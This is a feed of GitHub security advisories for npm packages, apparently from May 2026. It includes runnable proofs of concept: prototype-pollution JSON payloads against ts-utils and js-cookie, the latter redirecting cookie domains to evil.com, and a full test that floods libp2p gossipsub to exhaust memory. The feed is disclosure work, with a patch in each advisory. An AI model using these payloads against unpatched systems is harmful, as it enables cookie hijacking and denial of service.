<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-05-21T21:49:50.344Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@nevware21/ts-utils] @nevware21/ts-utils: Prototype Pollution in objDeepCopy/objCopyProps via for...in without hasOwnProperty]]></title>
        <id>https://github.com/advisories/GHSA-x7j8-49r8-mr43</id>
        <link href="https://github.com/advisories/GHSA-x7j8-49r8-mr43"/>
        <updated>2026-05-21T21:41:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The _copyProps function in lib/src/object/copy.ts uses for...in to iterate over source object properties without an Object.hasOwnProperty check, and does not filter dangerous keys (<strong>proto</strong>, constructor, prototype). This allows an attacker to pollute the prototype chain of all objects in the application.</p>
<h2 id="details">Details</h2>
<p>In _copyProps() (copy.ts lines 186-191), the code iterates all enumerable properties including inherited ones and dangerous keys like <strong>proto</strong>. Any object with a <strong>proto</strong> key (e.g., from untrusted JSON input) will overwrite the target's prototype.</p>
<h2 id="poc">PoC</h2>
<pre><code>const malicious = JSON.parse('{"__proto__": {"polluted": true}}');
objDeepCopy(malicious);
console.log({}.polluted); // true
</code></pre>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add objHasOwnProperty check and filter <strong>proto</strong>, constructor, prototype keys.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nevware21/ts-utils/security/advisories/GHSA-x7j8-49r8-mr43">https://github.com/nevware21/ts-utils/security/advisories/GHSA-x7j8-49r8-mr43</a></li>
<li><a href="https://github.com/advisories/GHSA-x7j8-49r8-mr43">https://github.com/advisories/GHSA-x7j8-49r8-mr43</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x7j8-49r8-mr43</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T21:41:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@libp2p/gossipsub] js-libp2p: Memory DoS via subscription flood of unique topics]]></title>
        <id>https://github.com/advisories/GHSA-4f8r-922h-2vgv</id>
        <link href="https://github.com/advisories/GHSA-4f8r-922h-2vgv"/>
        <updated>2026-05-21T21:38:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Three cooperating omissions in <code>@libp2p/gossipsub</code> allow an unauthenticated single peer to exhaust the Node.js heap of any gossipsub node with default options.</p>
<ol>
<li><strong><code>defaultDecodeRpcLimits.maxSubscriptions = Infinity</code></strong> (<code>packages/gossipsub/src/message/decodeRpc.ts:11</code>): no decode-level cap on subscription entries per RPC.</li>
<li><strong><code>handleReceivedSubscription</code> is unbounded</strong> (<code>gossipsub.ts:1009-1021</code>): every unique topic string creates a new <code>Map</code> entry + <code>Set</code> object in <code>this.topics</code> with no per-peer count limit.</li>
<li><strong><code>removePeer</code> leaves empty Sets</strong> (<code>gossipsub.ts:782-784</code>): after peer disconnect, empty Sets are never deleted from <code>this.topics</code> thus memory is non-reclaimable within the process lifetime.</li>
</ol>
<p>A single 4MB LP frame carries 349,525 unique topic SUBSCRIBE entries. Each frame causes <del>89MB of heap growth (</del>22x amplification). A Node.js process with a 1.5GB heap limit crashes after <del>17 such frames (</del>68MB total attacker bandwidth, achievable in ~5 seconds at 100Mbps).</p>
<h3 id="details">Details</h3>
<h4 id="defect-1-defaultdecoderpclimitsmaxsubscriptions--infinity-messagedecoderpcts11">Defect 1: <code>defaultDecodeRpcLimits.maxSubscriptions = Infinity</code> (<code>message/decodeRpc.ts:11</code>)</h4>
<pre><code class="language-typescript">export const defaultDecodeRpcLimits: DecodeRPCLimits = {                                                   
  maxSubscriptions: Infinity,   // &lt;- no decode-level cap                                                   
  // ...                                             
}                                                    
</code></pre>
<p>Passed directly to the protobuf decoder at <code>gossipsub.ts:863</code>. A single RPC may decode 349,525 SUBSCRIBE entries within the 4MB LP frame with no error.</p>
<h4 id="defect-2-handlereceivedsubscription-unbounded-growth-gossipsubts1009-1021">Defect 2: <code>handleReceivedSubscription</code> unbounded growth (<code>gossipsub.ts:1009-1021</code>)</h4>
<pre><code class="language-typescript">let topicSet = this.topics.get(topic)
if (topicSet == null) {
  topicSet = new Set()
  this.topics.set(topic, topicSet)   // new entry per unique topic, no count guard
}
topicSet.add(from.toString())
</code></pre>
<p><code>this.topics</code> (<code>Map&lt;TopicStr, Set&lt;PeerIdStr&gt;&gt;</code>, <code>gossipsub.ts:141</code>) has no size limit. No per-peer topic count is tracked. No heartbeat evicts unused entries. A comment at <code>gossipsub.ts:960</code> acknowledges the map is "not bounded by topic count", but only for the <code>allowedTopics != null</code> branch, the default is <code>null</code>.</p>
<h4 id="defect-3-removepeer-memory-leak-gossipsubts782-784">Defect 3: <code>removePeer</code> memory leak (<code>gossipsub.ts:782-784</code>)</h4>
<pre><code class="language-typescript">for (const peers of this.topics.values()) {
  peers.delete(id)
  // empty Set is NOT removed from this.topics
} 
</code></pre>
<p>After disconnect, <code>this.topics</code> retains N empty Sets, one per unique attacker topic. <code>stop()</code> (lines 575–602) clears 12 data structures but not <code>this.topics</code>. Memory is leaked for the process lifetime.</p>
<p>Secondary: the O(topics.size) synchronous scan in <code>removePeer</code> grows as <code>this.topics</code> accumulates from repeated attacks. After 17 rounds, the scan iterates ~6M entries each time any peer disconnects.</p>
<h4 id="attack-path">Attack path</h4>
<ol>
<li>Attacker dials victim and opens a gossipsub stream.</li>
<li>Score 0 &gt; <code>gossipThreshold = −10</code> thus subscriptions are processed immediately. No score check gates subscription handling.</li>
<li>Attacker constructs an RPC: 349,525 SUBSCRIBE entries with sequential 6-char topics. Total encoded size: 4.00 MB.</li>
<li>Victim's <code>handleReceivedRpc</code> calls <code>rpc.subscriptions.forEach(...)</code> → 349,525 calls to <code>handleReceivedSubscription</code> -&gt; <code>this.topics</code> grows by 349,525 entries -&gt; ~89MB heap consumed -&gt; ~224ms event-loop blocked.</li>
<li>Attacker reconnects. No score decay or penalty applies to subscription RPCs. Repeat.</li>
<li>After ~17 rounds (68MB attacker bandwidth): Node.js OOM (Out-Of-Memory) crash.</li>
</ol>
<h3 id="poc">PoC</h3>
<p><strong>Steps to reproduce</strong> (confirmed unpatched at HEAD <code>9eb27be79</code>):</p>
<pre><code class="language-bash">$ git clone https://github.com/libp2p/js-libp2p.git
$ cd js-libp2p                                         
$ npm install                                          
$ cd packages/gossipsub                                
$ npx aegir build                                      
$ node --experimental-vm-modules ../../node_modules/.bin/mocha 'dist/test/poc.js' --timeout 60000                                        
</code></pre>
<p>File PoC:</p>
<pre><code class="language-typescript">/* eslint-env mocha */

import { stop } from '@libp2p/interface'
import assert from 'node:assert'
import { performance } from 'node:perf_hooks'
import { RPC } from '../src/message/rpc.js'
import { createComponents, connectPubsubNodes } from './utils/create-pubsub.js'
import type { GossipSubAndComponents } from './utils/create-pubsub.js'

// Number of unique topics per attack RPC (for direct injection tests).
// Chosen to demonstrate impact without LP-framing; the ENCODE test shows
// how many actually fit in one 4 MB frame.
const UNIQUE_TOPICS_PER_RPC = 349_000

// Build a protobuf-encoded RPC with N unique SUBSCRIBE entries.
// Uses minimal 2-char topic strings ("00".."zz") to maximise packing.
// SubOpts(subscribe=true, topic=2chars): 2 + (2+2) = 6 bytes per entry.
// Outer RPC field: tag+len ≈ 2 bytes -&gt; ~8 bytes total per subscription.
// 4 MB / 8 bytes ≈ 524K subscriptions per frame.
function buildSubscriptionFloodRpc (count: number): Uint8Array {
  const subscriptions = Array.from({ length: count }, (_, i) =&gt; ({
    subscribe: true,
    // Sequential 6-char decimal topics: short but still unique
    topic: i.toString().padStart(6, '0')
  }))
  return RPC.encode({ subscriptions, messages: [], control: undefined })
}

// Binary-search the exact number of unique 6-char topics that fit in 4 MB.
function maxTopicsIn4MB (): number {
  const MAX_LP_BYTES = 4 * 1024 * 1024
  let lo = 1; let hi = 600_000
  while (lo &lt; hi) {
    const mid = (lo + hi + 1) &gt;&gt; 1
    if (buildSubscriptionFloodRpc(mid).byteLength &lt;= MAX_LP_BYTES) {
      lo = mid
    } else {
      hi = mid - 1
    }
  }
  return lo
}

describe('PoC: Memory DoS via subscription flood of unique topics', function () {
  this.timeout(60_000)

  let victim: GossipSubAndComponents
  let attacker: GossipSubAndComponents

  beforeEach(async () =&gt; {
    ;[victim, attacker] = await Promise.all([
      createComponents({ init: { allowPublishToZeroTopicPeers: true } }),
      createComponents({ init: { allowPublishToZeroTopicPeers: true } })
    ])
    await connectPubsubNodes(victim, attacker)
  })

  afterEach(async () =&gt; {
    await stop(
      victim.pubsub, attacker.pubsub,
      ...Object.values(victim.components),
      ...Object.values(attacker.components)
    )
  })

  it('FLOOD: unique topic subscriptions accumulate unboundedly in this.topics', () =&gt; {
    const victimPubsub = victim.pubsub as any
    const attackerIdStr = attacker.components.peerId.toString()

    const topicsBefore = victimPubsub.topics.size as number
    const heapBefore = process.memoryUsage().heapUsed

    // Simulate one round of subscription flood: inject UNIQUE_TOPICS_PER_RPC
    // unique topics directly via handleReceivedSubscription (the exact function
    // called synchronously from handleReceivedRpc for each decoded SubOpts entry).
    const t0 = performance.now()
    for (let i = 0; i &lt; UNIQUE_TOPICS_PER_RPC; i++) {
      victimPubsub.handleReceivedSubscription(
        { toString: () =&gt; attackerIdStr } as any,
        `poc-sub-flood-${i.toString().padStart(6, '0')}`,
        true
      )
    }
    const elapsed = performance.now() - t0

    const topicsAfter = victimPubsub.topics.size as number
    const heapAfterBytes = process.memoryUsage().heapUsed
    const heapGrowthMB = (heapAfterBytes - heapBefore) / (1024 * 1024)
    const newTopics = topicsAfter - topicsBefore

    console.log(`\n[PoC] Unique topics injected: ${UNIQUE_TOPICS_PER_RPC.toLocaleString()}`)
    console.log(`[PoC] this.topics.size: ${topicsBefore} -&gt; ${topicsAfter} (grew by ${newTopics.toLocaleString()})`)
    console.log(`[PoC] Heap growth (approx): ${heapGrowthMB.toFixed(0)} MB`)
    console.log(`[PoC] Time to process: ${elapsed.toFixed(0)} ms (event-loop blocked)`)
    console.log(`[PoC] Amplification: ${(heapGrowthMB / 4).toFixed(1)}x (MB heap per MB of attacker traffic)`)

    // All unique topics must be present in the map — no dedup for unique strings
    assert.strictEqual(newTopics, UNIQUE_TOPICS_PER_RPC,
      `expected this.topics to grow by ${UNIQUE_TOPICS_PER_RPC}, grew by ${newTopics}`)

    // Must be non-trivial heap growth
    assert.ok(heapGrowthMB &gt; 20,
      `expected &gt;20 MB heap growth from ${UNIQUE_TOPICS_PER_RPC} unique topics, got ${heapGrowthMB.toFixed(0)} MB`)
  })

  it('PERSIST: empty Sets remain in this.topics after peer disconnect (no GC)', () =&gt; {
    const victimPubsub = victim.pubsub as any
    const attackerIdStr = attacker.components.peerId.toString()

    // Flood with unique topics
    for (let i = 0; i &lt; UNIQUE_TOPICS_PER_RPC; i++) {
      victimPubsub.handleReceivedSubscription(
        { toString: () =&gt; attackerIdStr } as any,
        `poc-persist-${i.toString().padStart(6, '0')}`,
        true
      )
    }

    const topicsBeforeDisconnect = victimPubsub.topics.size as number

    // Simulate peer disconnect, this removes the peer ID from each Set but
    // does NOT delete empty Sets from this.topics.
    const tDisconnect = performance.now()
    victimPubsub.removePeer(attacker.components.peerId)
    const disconnectMs = performance.now() - tDisconnect

    const topicsAfterDisconnect = victimPubsub.topics.size as number

    console.log(`\n[PoC] this.topics.size before disconnect: ${topicsBeforeDisconnect.toLocaleString()}`)
    console.log(`[PoC] this.topics.size after  disconnect: ${topicsAfterDisconnect.toLocaleString()}`)
    console.log(`[PoC] removePeer() took: ${disconnectMs.toFixed(0)} ms (synchronous O(topics.size) scan)`)
    console.log(`[PoC] Empty Sets retained: ${topicsAfterDisconnect.toLocaleString()} -&gt; memory not freed`)

    // Topics Map is unchanged in SIZE — empty Sets persist
    assert.strictEqual(topicsAfterDisconnect, topicsBeforeDisconnect,
      `this.topics.size should be unchanged after disconnect (empty Sets persist); ` +
      `was ${topicsBeforeDisconnect}, now ${topicsAfterDisconnect}`)

    // removePeer O(N) scan should take non-trivial time with 349K entries
    assert.ok(disconnectMs &gt; 5,
      `expected removePeer to take &gt;5ms scanning ${topicsBeforeDisconnect} topics, got ${disconnectMs.toFixed(0)} ms`)

    // Verify Sets are actually empty (peer removed from each)
    let emptyCount = 0
    for (const [, peers] of victimPubsub.topics) {
      if ((peers as Set&lt;string&gt;).size === 0) emptyCount++
    }
    assert.ok(emptyCount &gt;= UNIQUE_TOPICS_PER_RPC,
      `expected ≥${UNIQUE_TOPICS_PER_RPC} empty Sets after disconnect, found ${emptyCount}`)
  })

  it('ENCODE: subscription flood RPC fits within 4 MB LP frame: confirms no LP-level protection', function () {
    this.timeout(30_000)
    const MAX_LP_BYTES = 4 * 1024 * 1024

    // Find exact maximum with binary search
    const maxCount = maxTopicsIn4MB()
    const rpc = buildSubscriptionFloodRpc(maxCount)

    const ampRatio = (maxCount * 260 / (1024 * 1024)) / 4

    console.log(`\n[PoC] Max subscriptions in 4 MB frame: ${maxCount.toLocaleString()}`)
    console.log(`[PoC] Serialised RPC size:              ${(rpc.byteLength / (1024 * 1024)).toFixed(2)} MB`)
    console.log(`[PoC] LP frame limit:                   ${(MAX_LP_BYTES / (1024 * 1024)).toFixed(0)} MB`)
    console.log(`[PoC] Fits in one frame:                ${rpc.byteLength &lt;= MAX_LP_BYTES ? 'YES ✓' : 'NO ✗'}`)
    console.log(`[PoC] defaultDecodeRpcLimits.maxSubscriptions = Infinity (no decode-level cap)`)
    console.log(`[PoC] Heap growth per 4 MB sent: ~${Math.round(maxCount * 260 / (1024 * 1024))} MB (${ampRatio.toFixed(1)}x amplification)`)

    assert.ok(rpc.byteLength &lt;= MAX_LP_BYTES,
      `crafted RPC (${rpc.byteLength} bytes) must fit in the 4 MB LP default — confirms no LP-level protection`)
    assert.ok(maxCount &gt; 100_000,
      `expected &gt;100K subscriptions per 4 MB frame, got ${maxCount}`)
  })
})
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Availability (memory)</strong>: single peer, ~68MB bandwidth -&gt; OOM crash in ~5s at 100Mbps. Non-recoverable within process lifetime thus memory never freed even if attacker disconnects.</li>
<li><strong>Availability (CPU)</strong>: 224ms event-loop block per 4MB subscription RPC (synchronous <code>forEach</code>); grows with accumulated attack state.</li>
<li><strong>No score mitigation</strong>: subscription processing has no score check and no score penalty for flooding.</li>
<li><strong>Affected deployments</strong>: any node running <code>@libp2p/gossipsub</code> with default options that accepts inbound connections: Lodestar (Ethereum consensus), IPFS pubsub, any <code>createLibp2p({ services: { pubsub: gossipsub() } })</code>.</li>
<li><strong>Partial mitigation only</strong>: setting <code>opts.allowedTopics</code> caps growth to <code>allowedTopics.size</code> topics per attacker; does not fix the memory leak for allowed topics or the O(N) <code>removePeer</code> scan.</li>
</ul>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Delete empty Sets on unsubscribe and disconnect:</p>
<pre><code class="language-typescript">// handleReceivedSubscription
} else {
  topicSet.delete(from.toString())
  if (topicSet.size === 0) this.topics.delete(topic)
}

// removePeer
for (const [topic, peers] of this.topics) {
  peers.delete(id)
  if (peers.size === 0) this.topics.delete(topic)
}
</code></pre>
<p>Clear <code>this.topics</code> in <code>stop()</code>:</p>
<pre><code class="language-typescript">this.topics.clear()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/libp2p/js-libp2p/security/advisories/GHSA-4f8r-922h-2vgv">https://github.com/libp2p/js-libp2p/security/advisories/GHSA-4f8r-922h-2vgv</a></li>
<li><a href="https://github.com/advisories/GHSA-4f8r-922h-2vgv">https://github.com/advisories/GHSA-4f8r-922h-2vgv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4f8r-922h-2vgv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T21:38:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[js-cookie] JavaScript Cookie: Per-instance prototype hijack in assign() enables cookie-attribute injection]]></title>
        <id>https://github.com/advisories/GHSA-qjx8-664m-686j</id>
        <link href="https://github.com/advisories/GHSA-qjx8-664m-686j"/>
        <updated>2026-05-21T21:20:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>js-cookie</code>'s internal <code>assign()</code> helper copies properties with <code>for...in</code> + plain assignment. When the source object is produced by <code>JSON.parse</code>, the JSON object's <code>"__proto__"</code> member is an <em>own enumerable</em> property, so the <code>for…in</code> enumerates it and the <code>target[key] = source[key]</code> write triggers the <strong><code>Object.prototype.__proto__</code> setter</strong> on the fresh <code>target</code> (<code>{}</code>). The result is a per-instance prototype hijack: <code>Object.prototype</code> itself is untouched, but the merged <code>attributes</code> object now inherits attacker-controlled keys.</p>
<p>Because the consuming <code>set()</code> function then enumerates the merged object with another <code>for...in</code>, every key the attacker placed on the polluted prototype lands in the resulting <code>Set-Cookie</code> string as an attribute pair. The attacker can set <code>domain=</code>, <code>secure=</code>, <code>samesite=</code>, <code>expires=</code>, and <code>path=</code> on cookies whose attributes the developer thought were locked down.</p>
<h2 id="impact">Impact</h2>
<p>Any application that forwards a JSON-derived object as the <code>attributes</code> argument to <code>Cookies.set</code>, <code>Cookies.remove</code>, <code>Cookies.withAttributes</code>, or <code>Cookies.withConverter</code> is vulnerable. This is the standard pattern when cookie configuration comes from a backend:</p>
<pre><code class="language-js">const cfg = await fetch('/config').then(r =&gt; r.json());
Cookies.set('session', token, cfg.cookieAttrs);   // cfg.cookieAttrs influenced by attacker
</code></pre>
<p>A payload of <code>{"__proto__":{"domain":"evil.example","secure":"false","samesite":"None"}}</code> causes js-cookie to emit:</p>
<pre><code>Set-Cookie: session=TOKEN; path=/; domain=evil.example; secure=false; samesite=None
</code></pre>
<h2 id="affected-code">Affected code</h2>
<pre><code class="language-js">// src/assign.mjs — full file
export default function (target) {
  for (var i = 1; i &lt; arguments.length; i++) {
    var source = arguments[i]
    for (var key in source) {                 // includes own enumerable '__proto__'
      target[key] = source[key]                // [[Set]] form - fires __proto__ setter
    }
  }
  return target
}
</code></pre>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Node 22.11.0, no third-party deps:</p>
<h3 id="environment-setup">Environment setup</h3>
<pre><code class="language-bash">mkdir -p /tmp/jscookie-poc &amp;&amp; cd /tmp/jscookie-poc
npm init -y
npm i js-cookie
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">ubuntu@kuber:/tmp/jscookie-poc$ cat poc.mjs
let lastSetCookie = '';
globalThis.document = {
  get cookie() { return ''; },
  set cookie(v) { lastSetCookie = v; }
};

const { default: Cookies } = await import('js-cookie');

const attackerAttrs = JSON.parse(
  '{"__proto__":{"secure":"false","domain":"evil.com","samesite":"None","expires":-1}}'
);

Cookies.set('session', 'TOKEN', attackerAttrs);

console.log('Set-Cookie that js-cookie wrote to document.cookie:');
console.log(lastSetCookie);
</code></pre>
<p>Execution:
<img src="https://github.com/user-attachments/assets/120df1fe-7e97-4ca3-904e-ab80d71ecf62" alt="cls-2026-05-14-01 44 39" height="1174" width="2614"></p>
<h2 id="suggested-patch">Suggested patch</h2>
<pre><code class="language-diff">--- a/src/assign.mjs
+++ b/src/assign.mjs
@@
 export default function (target) {
   for (var i = 1; i &lt; arguments.length; i++) {
     var source = arguments[i]
-    for (var key in source) {
-      target[key] = source[key]
-    }
+    for (var key in source) {
+      if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue
+      Object.defineProperty(target, key, {
+        value: source[key],
+        writable: true,
+        enumerable: true,
+        configurable: true,
+      })
+    }
   }
   return target
 }
</code></pre>
<p>Equivalent one-liner alternative - iterate own names only and filter:</p>
<pre><code class="language-js">for (const key of Object.getOwnPropertyNames(source)) {
  if (key === '__proto__') continue
  target[key] = source[key]
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/js-cookie/js-cookie/security/advisories/GHSA-qjx8-664m-686j">https://github.com/js-cookie/js-cookie/security/advisories/GHSA-qjx8-664m-686j</a></li>
<li><a href="https://github.com/advisories/GHSA-qjx8-664m-686j">https://github.com/advisories/GHSA-qjx8-664m-686j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjx8-664m-686j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T21:20:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hulumi/policies] @hulumi/policies: Stack-wide evidence bypassed Cloudflare and deployment-governance guardrails]]></title>
        <id>https://github.com/advisories/GHSA-59f3-7227-wmh4</id>
        <link href="https://github.com/advisories/GHSA-59f3-7227-wmh4"/>
        <updated>2026-05-21T20:47:48.000Z</updated>
        <content type="html"><![CDATA[<p>Impact: @hulumi/policies versions before 1.3.2 used stack-wide evidence shortcuts in several Cloudflare and deployment-governance validators. Unrelated compliant-looking evidence could suppress violations for different zones, hostnames, origins, or repositories in the same stack.</p>
<p>Patched in 1.3.2: validators now correlate evidence to the specific protected resource and include regression coverage for unrelated-evidence bypasses.</p>
<p>Remediation: upgrade @hulumi/policies to 1.3.2 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-59f3-7227-wmh4">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-59f3-7227-wmh4</a></li>
<li><a href="https://github.com/advisories/GHSA-59f3-7227-wmh4">https://github.com/advisories/GHSA-59f3-7227-wmh4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-59f3-7227-wmh4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:47:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hulumi/policies] @hulumi/policies: GitHub OIDC trust policy bypass via AWS set-qualified condition operators]]></title>
        <id>https://github.com/advisories/GHSA-q2f7-m237-v562</id>
        <link href="https://github.com/advisories/GHSA-q2f7-m237-v562"/>
        <updated>2026-05-21T20:45:18.000Z</updated>
        <content type="html"><![CDATA[<p>Impact: @hulumi/policies versions before 1.3.2 only checked exact AWS IAM StringLike/StringEquals condition operator keys in G_OIDC_1. Set-qualified operators such as ForAnyValue:StringLike could hide wildcard GitHub Actions OIDC sub conditions from the mandatory guardrail.</p>
<p>Patched in 1.3.2: the AWS trust-policy inspector now evaluates set-qualified string operators and rejects unsafe GitHub OIDC sub conditions.</p>
<p>Remediation: upgrade @hulumi/policies to 1.3.2 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-q2f7-m237-v562">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-q2f7-m237-v562</a></li>
<li><a href="https://github.com/advisories/GHSA-q2f7-m237-v562">https://github.com/advisories/GHSA-q2f7-m237-v562</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q2f7-m237-v562</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-21T20:45:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hulumi/policies] @hulumi/policies: CIS 1.16 admin policy bypass for inline and attached IAM policies]]></title>
        <id>https://github.com/advisories/GHSA-4xrh-5m3m-328w</id>
        <link href="https://github.com/advisories/GHSA-4xrh-5m3m-328w"/>
        <updated>2026-05-21T20:44:13.000Z</updated>
        <content type="html"><![CDATA[<p>Impact: @hulumi/policies versions before 1.3.2 did not fully inspect inline and attached IAM policy evidence for the administrator-policy guardrail, so some admin-equivalent policy paths could pass policy evaluation.</p>
<p>Patched in 1.3.2: the validator inspects the affected policy shapes and includes regression tests.</p>
<p>Remediation: upgrade @hulumi/policies to 1.3.2 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-4xrh-5m3m-328w">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-4xrh-5m3m-328w</a></li>
<li><a href="https://github.com/advisories/GHSA-4xrh-5m3m-328w">https://github.com/advisories/GHSA-4xrh-5m3m-328w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4xrh-5m3m-328w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hulumi/policies] @hulumi/policies: HULUMI-H1 SecureBucket parent spoof bypass]]></title>
        <id>https://github.com/advisories/GHSA-g43v-9x7q-83pq</id>
        <link href="https://github.com/advisories/GHSA-g43v-9x7q-83pq"/>
        <updated>2026-05-21T20:43:58.000Z</updated>
        <content type="html"><![CDATA[<p>Impact: @hulumi/policies versions before 1.3.2 could accept spoofed SecureBucket parent evidence for HULUMI-H1, allowing policy evaluation to miss an unsafe bucket shape.</p>
<p>Patched in 1.3.2: the validator now correlates evidence to the expected component/resource relationship and includes regression coverage.</p>
<p>Remediation: upgrade @hulumi/policies to 1.3.2 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-g43v-9x7q-83pq">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-g43v-9x7q-83pq</a></li>
<li><a href="https://github.com/advisories/GHSA-g43v-9x7q-83pq">https://github.com/advisories/GHSA-g43v-9x7q-83pq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g43v-9x7q-83pq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:43:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hulumi/drift] @hulumi/drift: Orphan reconciler accepted externally supplied execute plans]]></title>
        <id>https://github.com/advisories/GHSA-2ffm-hxrq-qqmm</id>
        <link href="https://github.com/advisories/GHSA-2ffm-hxrq-qqmm"/>
        <updated>2026-05-21T20:43:42.000Z</updated>
        <content type="html"><![CDATA[<p>Impact: @hulumi/drift versions before 1.3.2 could accept externally supplied execute plans without sufficient provenance checks, allowing unsafe reconciliation input to be treated as trusted.</p>
<p>Patched in 1.3.2: execute-plan handling now validates provenance and rejects untrusted plans, with regression coverage.</p>
<p>Remediation: upgrade @hulumi/drift to 1.3.2 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-2ffm-hxrq-qqmm">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-2ffm-hxrq-qqmm</a></li>
<li><a href="https://github.com/advisories/GHSA-2ffm-hxrq-qqmm">https://github.com/advisories/GHSA-2ffm-hxrq-qqmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2ffm-hxrq-qqmm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:43:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hulumi/baseline] @hulumi/baseline: CloudTrail selector tampering events were not fully detected]]></title>
        <id>https://github.com/advisories/GHSA-gfp8-mp24-5vxg</id>
        <link href="https://github.com/advisories/GHSA-gfp8-mp24-5vxg"/>
        <updated>2026-05-21T20:43:28.000Z</updated>
        <content type="html"><![CDATA[<p>Impact: @hulumi/baseline versions before 1.3.2 could miss some CloudTrail event-selector tampering evidence, reducing coverage for changes to audit logging configuration.</p>
<p>Patched in 1.3.2: detection coverage and regression tests were expanded.</p>
<p>Remediation: upgrade @hulumi/baseline to 1.3.2 or later and rerun affected previews/checks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-gfp8-mp24-5vxg">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-gfp8-mp24-5vxg</a></li>
<li><a href="https://github.com/advisories/GHSA-gfp8-mp24-5vxg">https://github.com/advisories/GHSA-gfp8-mp24-5vxg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfp8-mp24-5vxg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T20:43:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: Stale Auth Cache After API Token Deletion]]></title>
        <id>https://github.com/advisories/GHSA-f76x-f9vj-92jv</id>
        <link href="https://github.com/advisories/GHSA-f76x-f9vj-92jv"/>
        <updated>2026-05-21T20:39:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Deleted API tokens continued to authenticate requests until their cache entry expired, because the auth cache was not invalidated by token value at deletion time.</p>
<h3 id="details">Details</h3>
